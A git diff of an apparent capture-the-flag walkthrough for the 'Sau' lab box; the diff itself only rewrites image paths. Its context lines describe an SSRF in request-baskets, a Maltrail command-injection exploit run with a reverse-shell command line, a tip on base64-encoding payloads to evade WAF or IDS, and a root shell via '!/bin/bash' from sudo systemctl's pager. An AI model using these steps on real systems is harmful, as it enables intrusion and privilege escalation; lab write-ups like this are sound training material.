@@ -76,18 +76,18 @@ Looks to be heavily web focused so let's go check out the landing page. Port 80 
 
 The application on port 55555 seems to be used for inspecting HTTP packets, almost like a web-based Wireshark. The page's footer discloses that it's powered by request-baskets v1.2.1 .
 
-![](../assets/img/2026-01-28-Sau/1.png)
+![](/assets/img/2026-01-28-Sau/1.png)
 
 ## SSRF
 I Google this software to find any known exploits, since it's open source and find [CVE-2023–27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163) which is prone to SSRF via the baskets API. We can send a specially crafted API request to /api/baskets/{name} to access sensitive information and network resources on the server.
 
 I find this [PoC](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3) containing a script for us to replicate on this machine. I use this to find out what is running on port 80 by supplying the first URL of the site running request-baskets and then the localhost IP with port 80 after it. 
 
-![](../assets/img/2026-01-28-Sau/2.png)
+![](/assets/img/2026-01-28-Sau/2.png)
 
 Executing that will create a new basket at a strange string and navigating to it will forward the page on port 80 to our browser.
 
-![](../assets/img/2026-01-28-Sau/3.png)
+![](/assets/img/2026-01-28-Sau/3.png)
 
 This page looks pretty scarce as we can't load too much using this technique, however it is being powered by Maltrail v0.53. Once again Googling for known vulnerabilities against this service gives us an exploit for unauthenticated OS command injection via the username parameter. 
 
@@ -100,14 +100,14 @@ python3 exploit.py 10.10.15.133 9001 http://10.129.229.26:55555/uqiunh
 
 This vulnerability exists due to unsanitized user input in one of the parameters. If needed, it is possible to base64 encode the payload to bypass any WAF, IDS, or IPS.
 
-![](../assets/img/2026-01-28-Sau/4.png)
+![](/assets/img/2026-01-28-Sau/4.png)
 
 I get a shell on the machine as 'puma' and start looking at ways to escalate privileges to root. We can also grab the user flag under their home directory.
 
 Privilege Escalation
 Listing Sudo permissions for our current account show that we can run a status check on trail.service using the systemctl binary as root user. The version installed is 245.4 for Ubuntu, so let's try to find any exploits regarding this particular case.
 
-![](../assets/img/2026-01-28-Sau/5.png)
+![](/assets/img/2026-01-28-Sau/5.png)
 
 I end up finding [CVE-2023–26604](https://nvd.nist.gov/vuln/detail/cve-2023-26604), which states that versions predating 247 don't adequately block local privesc for some Sudo configurations. More specifically it fails to set the `LESSSECURE` environment var to 1, meaning that other programs may be launched from the less binary's program.
 
@@ -115,6 +115,6 @@ When we run the systemctl status command as Sudo, the less command gets executed
 
 To use this exploit simply run the Sudo command to display the status in its entirety, and then type `!/bin/bash` once in the smaller looking terminal to spawn a root shell. 
 
-![](../assets/img/2026-01-28-Sau/6.png)
+![](/assets/img/2026-01-28-Sau/6.png)
 
 That's all folks. This box was fun as it tested our ability to find vulnerabilities and exploits from search engines or by other means. I hope this was helpful to anyone following along or stuck and happy hacking!
